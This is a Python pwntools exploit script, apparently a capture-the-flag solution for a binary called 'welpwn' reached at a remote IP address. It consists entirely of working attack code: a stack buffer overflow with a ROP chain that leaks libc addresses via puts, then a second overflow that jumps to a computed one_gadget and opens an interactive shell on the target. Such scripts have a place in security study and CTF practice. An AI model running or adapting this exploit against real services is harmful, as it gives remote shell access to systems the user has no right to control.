from pwn import *
from time import sleep

#p = process('welpwn')
p = remote('180.76.178.48',6666)

raw_input('Wait')

gadget_pop_4_trash_on_stack = 0x40089c
gadget_pop_rdi = 0x4008a3
libc_start_main_gotplt = 0x601040
puts_gotplt = 0x601018 # use to get libc.so.6
puts_plt = 0x4005a0
fflush_plt = 0x400620
_start_addr = 0x400630

print p.recv()
p.sendline( "A"*24 +p64(gadget_pop_4_trash_on_stack) \
        + p64(gadget_pop_rdi) + p64(libc_start_main_gotplt) + p64(puts_plt) \
        + p64(gadget_pop_rdi) + p64(puts_gotplt) + p64(puts_plt) + \
        p64(gadget_pop_rdi) + p64(0x0) + p64(fflush_plt) \
        + p64(_start_addr))
X = p.recv()

print ":".join("{:02x}".format(ord(c)) for c in X[27:])
print "_libc_start_main addr: ",hex(u64(X[27:33]+"\x00\x00"))

start_main_addr = u64(X[27:33]+"\x00\x00")
one_gadget = start_main_addr-0x21dd0+0xe681d

print "One gadget:", hex(one_gadget)
p.sendline( "A"*24 +p64(one_gadget) )

print "Get Shell"
p.interactive()
